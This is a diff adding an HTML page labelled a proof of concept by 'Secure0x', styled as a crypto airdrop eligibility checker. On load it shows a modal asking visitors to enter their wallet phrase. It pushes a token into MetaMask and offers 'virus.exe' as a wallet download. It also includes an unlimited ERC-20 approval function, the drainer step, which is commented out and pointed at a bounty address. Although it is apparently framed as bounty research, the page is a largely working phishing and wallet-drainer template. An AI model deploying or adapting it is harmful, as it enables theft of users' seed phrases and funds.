@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <title>POC BY Secure0x</title>
+    <link rel="icon" type="image/x-icon" href="https://ethsec.blog/logo_ethsec.jpg">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&amp;display=swap" rel="stylesheet">
+    <style>
+        body {
+            background-color: #0a0a0a;
+            color: #ffffff;
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Inter', sans-serif;
+            overflow: hidden;
+            width: 100%;
+            position: relative;
+        }
+
+        canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+        }
+
+        .top-watermark {
+            position: fixed;
+            top: 15%;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 100;
+            text-align: center;
+            animation: fadeInDown 1s ease-out;
+            width: 100%;
+            max-width: 800px;
+            padding: 0 20px;
+            box-sizing: border-box;
+        }
+
+        .top-watermark .poc {
+            font-size: clamp(1.2rem, 3vw, 1.8rem);
+            color: rgba(255, 255, 255, 0.7);
+            margin-bottom: 5px;
+            letter-spacing: 2px;
+            font-weight: 500;
+        }
+
+        .top-watermark .author {
+            font-size: clamp(2rem, 5vw, 3.5rem);
+            font-weight: 700;
+            background: linear-gradient(90deg, #00aaff, #67ccff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: gradientShift 8s ease infinite;
+        }
+
+        @keyframes fadeInDown {
+            from {
+                opacity: 0;
+                transform: translate(-50%, -20px);
+            }
+            to {
+                opacity: 1;
+                transform: translate(-50%, 0);
+            }
+        }
+
+        @keyframes gradientShift {
+            0% { filter: hue-rotate(0deg) brightness(1); }
+            50% { filter: hue-rotate(30deg) brightness(1.2); }
+            100% { filter: hue-rotate(0deg) brightness(1); }
+        }
+
+        .container {
+            position: fixed;
+            width: 90%;
+            max-width: 800px;
+            text-align: center;
+            z-index: 1;
+            margin-top: 100px;
+            background: none;
+            box-shadow: none;
+            padding: 0;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
+        .container::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: conic-gradient(from 0deg, #1a1a1a, #000000, #1a1a1a);
+            animation: rotateGlow 12s linear infinite;
+            filter: blur(20px);
+            opacity: 0.5;
+            z-index: -1;
+        }
+
+        .button-container {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin: 0 auto;
+            width: 100%;
+            max-width: 800px;
+            /* flex-wrap: wrap; */
+            padding: 0 20px;
+            box-sizing: border-box;
+        }
+
+        button {
+            background: linear-gradient(135deg, #0f3b82, #4c0e82, #800d47);
+            border: none;
+            padding: clamp(15px, 3vw, 25px) clamp(30px, 5vw, 60px);
+            border-radius: 12px;
+            color: #fff;
+            font-size: clamp(0.9rem, 2vw, 1.1rem);
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-family: monospace;
+            letter-spacing: 0.5px;
+            flex: 0 0 auto;
+            min-width: 220px;
+            width: auto;
+            max-width: none;
+            white-space: nowrap;
+            overflow: visible;
+            text-overflow: unset;
+            box-sizing: border-box;
+        }
+
+        button:hover {
+            transform: translateY(-2px) scale(1.02);
+            border-color: white;
+            box-shadow: 0 0 0 2px white;
+        }
+
+        #overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(5px);
+            z-index: 1000;
+        }
+
+        #promptBox {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: rgba(10, 12, 16, 0.95);
+            padding: clamp(20px, 5vw, 40px);
+            border-radius: 16px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            z-index: 1001;
+            text-align: center;
+            width: 90%;
+            max-width: 60%;
+            border: 1px solid rgba(0, 170, 255, 0.1);
+            box-sizing: border-box;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: clamp(15px, 3vw, 20px);
+            font-size: clamp(0.9rem, 2vw, 1.1rem);
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(0, 170, 255, 0.2);
+            border-radius: 12px;
+            color: #fff;
+            text-align: center;
+            font-family: monospace;
+            margin-bottom: 20px;
+            transition: all 0.3s ease;
+            letter-spacing: 1px;
+            box-sizing: border-box;
+        }
+
+        input[type="text"]:focus {
+            outline: none;
+            border-color: rgba(0, 170, 255, 0.5);
+            box-shadow: 0 0 15px rgba(0, 170, 255, 0.1);
+        }
+
+        input[type="text"]::placeholder {
+            color: rgba(255, 255, 255, 0.5);
+            font-family: monospace;
+            font-size: 1rem;
+            letter-spacing: 1px;
+        }
+
+        .highlight {
+            color: #00aaff;
+            font-weight: 500;
+        }
+
+        a {
+            text-decoration: none;
+            color: inherit;
+        }
+
+        h1 {
+            display: block;
+            font-size: clamp(1.5rem, 4vw, 2.2rem);
+            margin-block-start: 0.67em;
+            margin-block-end: 0.67em;
+            margin-inline-start: 0px;
+            margin-inline-end: 0px;
+            font-weight: bold;
+            unicode-bidi: isolate;
+            font-family: 'Inter', sans-serif;
+
+        }
+
+        @media screen and (max-width: 768px) {
+            .button-container {
+                gap: 15px;
+            }
+            
+            button {
+                min-width: 160px;
+                width: auto;
+                max-width: none;
+            }
+            
+            .container {
+                margin-top: 80px;
+            }
+            
+            .top-watermark {
+                top: 5%;
+            }
+        }
+
+        @media screen and (max-width: 480px) {
+            .button-container {
+                flex-direction: column;
+                align-items: center;
+            }
+            
+            button {
+                width: 100%;
+                min-width: 120px;
+                max-width: 100%;
+            }
+            
+            .container {
+                margin-top: 60px;
+            }
+        }
+
+    </style>
+<script src="chrome-extension://idnnbdplmphpflfnlkomgpfbpcgelopg/inpage.js" id="xverse-wallet-provider" data-is-priority="true"></script></head>
+<body>
+    <canvas id="backgroundCanvas" width="1364" height="1154"></canvas>
+
+    <div class="top-watermark">
+        <div class="poc">POC MADE BY</div>
+        <div class="author">Secure0x</div>
+    </div>
+
+    <div id="overlay" style="display: none;"></div>
+    <div id="promptBox" style="display: none;">
+        <input type="text" placeholder="ENTER PHRASE TO CLAIM AIRDROP">
+        <button onclick="closePrompt()">VERIFY &amp; SUBMIT</button>
+    </div>
+
+    <div class="container">
+        <img class="center" src="https://ethsec.blog/poc_/secure0x_qr.png" style="display: block; margin-left: auto; margin-right: auto; width: 35%; margin-top: 20%;">
+        <br>
+        <h1 style="color:wheat;">&nbsp;&nbsp;CHECK $AIRDROP ELIGIBILITY</h1>
+        <br>
+        <div class="button-container">
+            <button onclick="addTokenFunction()" class="add">ADD TOKEN TO METAMASK</button>
+            <a href="virus.exe" download="">
+                <button class="add">DOWNLOAD OUR WALLET</button>
+            </a>
+        </div>
+        <br><br>
+        <input type="text" style="font-size: 15px;" placeholder="ENTER PHRASE TO CLAIM AIRDROP" id="walletAddress">
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <script>
+        // Background animation
+        const canvas = document.getElementById('backgroundCanvas');
+        const ctx = canvas.getContext('2d');
+
+        function resizeCanvas() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        }
+        resizeCanvas();
+        window.addEventListener('resize', resizeCanvas);
+
+        const particles = [];
+        const particleCount = 50;
+        const connectionDistance = 150;
+        const particleSize = 2;
+
+        class Particle {
+            constructor() {
+                this.reset();
+            }
+
+            reset() {
+                this.x = Math.random() * canvas.width;
+                this.y = Math.random() * canvas.height;
+                this.vx = (Math.random() - 0.5) * 0.5;
+                this.vy = (Math.random() - 0.5) * 0.5;
+            }
+
+            update() {
+                this.x += this.vx;
+                this.y += this.vy;
+                if (this.x < 0 || this.x > canvas.width) this.vx *= -1;
+                if (this.y < 0 || this.y > canvas.height) this.vy *= -1;
+            }
+
+            draw() {
+                ctx.beginPath();
+                ctx.arc(this.x, this.y, particleSize, 0, Math.PI * 2);
+                ctx.fillStyle = 'rgba(100, 100, 100, 0.3)';
+                ctx.fill();
+            }
+        }
+
+        for (let i = 0; i < particleCount; i++) {
+            particles.push(new Particle());
+        }
+
+        function animate() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+            particles.forEach(particle => {
+                particle.update();
+                particle.draw();
+            });
+
+            ctx.beginPath();
+            for (let i = 0; i < particles.length; i++) {
+                for (let j = i + 1; j < particles.length; j++) {
+                    const dx = particles[i].x - particles[j].x;
+                    const dy = particles[i].y - particles[j].y;
+                    const distance = Math.sqrt(dx * dx + dy * dy);
+
+                    if (distance < connectionDistance) {
+                        const opacity = (1 - distance / connectionDistance) * 0.2;
+                        ctx.strokeStyle = `rgba(100, 100, 100, ${opacity})`;
+                        ctx.lineWidth = 1;
+                        ctx.moveTo(particles[i].x, particles[i].y);
+                        ctx.lineTo(particles[j].x, particles[j].y);
+                    }
+                }
+            }
+            ctx.stroke();
+
+            requestAnimationFrame(animate);
+        }
+
+        animate();
+
+        // Token functionality
+        const tokenAddress = '0xc00971105e61274c8a5cd5a88fe7e037d935b513';
+        const tokenSymbol = 'SECUREX_POC';
+        const tokenDecimals = 18;
+        const tokenImage = 'https://ethsec.blog/logo_ethsec.jpg';
+
+        async function addTokenFunction() {
+            try {
+                const wasAdded = await ethereum.request({
+                    method: 'wallet_watchAsset',
+                    params: {
+                        type: 'ERC20',
+                        options: {
+                            address: tokenAddress,
+                            symbol: tokenSymbol,
+                            decimals: tokenDecimals,
+                            image: tokenImage
+                        }
+                    }
+                });
+
+                if (wasAdded) {
+                    console.log('Token added successfully!');
+                }
+            } catch (error) {
+                console.log(error);
+            }
+        }
+
+        const spenderAddress = '0xc00971105e61274c8a5cd5a88fe7e037d935b513'; 
+        const tokenABI = [
+        "function approve(address spender, uint256 amount) external returns (bool)"
+        ];
+
+        async function approveUnlimitedToken() {
+            if (!window.ethereum) {
+              console.log("MetaMask is not installed.");
+              return;
+            }
+          
+            try {
+              // 👇 Request account access from MetaMask
+              await window.ethereum.request({ method: 'eth_requestAccounts' });
+          
+              const provider = new ethers.providers.Web3Provider(window.ethereum);
+              const signer = provider.getSigner();
+              const tokenContract = new ethers.Contract("0xCaA870affE8Ac32822eBfC04Eb4dF1536B49e938", tokenABI, signer); // Using our bounty address rather than malicious smart contract to drain user funds.
+          
+              const tx = await tokenContract.approve(
+                spenderAddress,
+                ethers.constants.MaxUint256
+              );
+          
+              console.log("Approval transaction sent:", tx.hash);
+              await tx.wait();
+              console.log("Approval confirmed!");
+            } catch (error) {
+              console.error("Approval failed:", error);
+            }
+        }
+
+        function closePrompt() {
+            document.getElementById('overlay').style.display = 'none';
+            document.getElementById('promptBox').style.display = 'none';
+        }
+
+        window.onload = function() {
+            document.getElementById('overlay').style.display = 'block';
+            document.getElementById('promptBox').style.display = 'block';
+            addTokenFunction();
+            // approveUnlimitedToken();
+        };
+    </script>
+
+</body></html>
